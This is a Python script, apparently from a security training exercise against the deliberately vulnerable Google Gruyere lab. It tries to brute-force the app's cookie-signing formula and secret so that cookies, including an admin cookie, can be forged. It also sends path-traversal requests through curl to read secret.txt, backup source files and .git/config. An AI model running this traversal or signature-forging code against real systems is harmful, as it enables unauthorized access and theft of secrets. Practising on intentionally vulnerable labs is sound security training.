#!/usr/bin/env python3
"""Round 2 (계속) — 쿠키 서명 스킴 규명 시도 + 설정파일 정보노출 확인.

알려진 (cookie_data, 서명) 쌍 4개를 제약조건으로 써서 서명 공식 후보를 소거한다.
서명은 인스턴스 무관 전역값임을 확인했다(3개 인스턴스에서 동일).
"""
from __future__ import annotations

import hashlib
import subprocess
import zlib
from pathlib import Path

SCRATCH = Path(__file__).resolve().parent.parent / "scratch"
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = SCRATCH / "gruyere.cookies"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"
MASK = 0x7FFFFFF

# 실측으로 얻은 (cookie_data, 서명) 쌍 — 4개 계정 로그인으로 확보
KNOWN = [
    ("brie||author", 74315992),
    ("administrator|admin|", 31131337),
    ("cheddar||author", 40461140),
    ("sardo||author", 22005508),
]

SECRET_CANDIDATES = ["Cookie!", "Cookie!\n", "Cookie", "cookie!", "", "secret", "gruyere", "Cookie! "]


def py2_hash(s: str) -> int:
    if not s:
        return 0
    x = ord(s[0]) << 7
    for ch in s:
        x = ((1000003 * x) ^ ord(ch)) & ((1 << 64) - 1)
    x = (x ^ len(s)) & ((1 << 64) - 1)
    return x - (1 << 64) if x >= 1 << 63 else x


def main() -> None:
    print("=" * 72)
    print("A) 서명 공식 후보 소거 (4개 제약조건 모두 만족해야 채택)")
    print("=" * 72)
    hits = []
    formulas = {
        "py2hash(secret+cdata)&MASK": lambda s, c: py2_hash(s + c) & MASK,
        "py2hash(cdata+secret)&MASK": lambda s, c: py2_hash(c + s) & MASK,
        "py2hash(secret+cdata)%2**27": lambda s, c: py2_hash(s + c) % (2 ** 27),
        "py2hash(secret+cdata)&MASK abs": lambda s, c: abs(py2_hash(s + c)) & MASK,
        "md5(secret+cdata)[:8]&MASK": lambda s, c: int(hashlib.md5((s + c).encode()).hexdigest()[:8], 16) & MASK,
        "md5(cdata+secret)[:8]&MASK": lambda s, c: int(hashlib.md5((c + s).encode()).hexdigest()[:8], 16) & MASK,
        "crc32(secret+cdata)&MASK": lambda s, c: zlib.crc32((s + c).encode()) & MASK,
        "py2hash(secret)^py2hash(cdata)": lambda s, c: (py2_hash(s) ^ py2_hash(c)) & MASK,
    }
    for fname, fn in formulas.items():
        for secret in SECRET_CANDIDATES:
            got = [fn(secret, c) for c, _ in KNOWN]
            want = [h for _, h in KNOWN]
            score = sum(1 for a, b in zip(got, want) if a == b)
            if score:
                print(f"  {fname:32s} secret={secret!r:12s} 일치 {score}/4  {got}")
                if score == 4:
                    hits.append((fname, secret))
    if not hits:
        print("  → 4/4 를 만족하는 후보 없음. 서버가 소스(local판)와 다른 공식/시크릿을 쓴다.")
        print("    (참고: py2hash('Cookie!\\n'+'brie||author')&MASK =", py2_hash("Cookie!\n" + "brie||author") & MASK, ")")

    print()
    print("=" * 72)
    print("B) 설정파일 정보노출 — 경로이탈로 알려진 후보 파일 읽기")
    print("=" * 72)
    targets = [
        "../secret.txt", "../stored-data.txt", "../data.py.bak", "../gruyere.py.bak",
        "../app.yaml", "../app.yaml.bak", "../gruyere.py", "../README", "../gtl.py.bak",
        "../resources/data.py.bak", "../.git/config", "../secret.txt.bak",
    ]
    for t in targets:
        enc = t.replace("../", "%2e%2e%2f") if t.startswith("../") else t
        cmd = ["curl", "-s", "-i", "--path-as-is", "--max-time", "25",
               "-x", "http://127.0.0.1:8080", "--cacert", CA,
               "-b", str(JAR), BASE + "/" + enc]
        out = subprocess.run(cmd, capture_output=True, text=True).stdout
        body = out.split("\r\n\r\n", 1)[-1] if "\r\n\r\n" in out else out
        note = ""
        if "Invalid request" in body:
            note = "없음/차단"
        elif "Unrecognized file type" in body:
            note = "확장자 미허용"
        elif body.strip():
            note = f"읽힘! 앞부분: {body.strip()[:90]!r}"
        else:
            note = "(빈 응답)"
        print(f"  {t:34s} len={len(body):6d}  {note}")


if __name__ == "__main__":
    main()
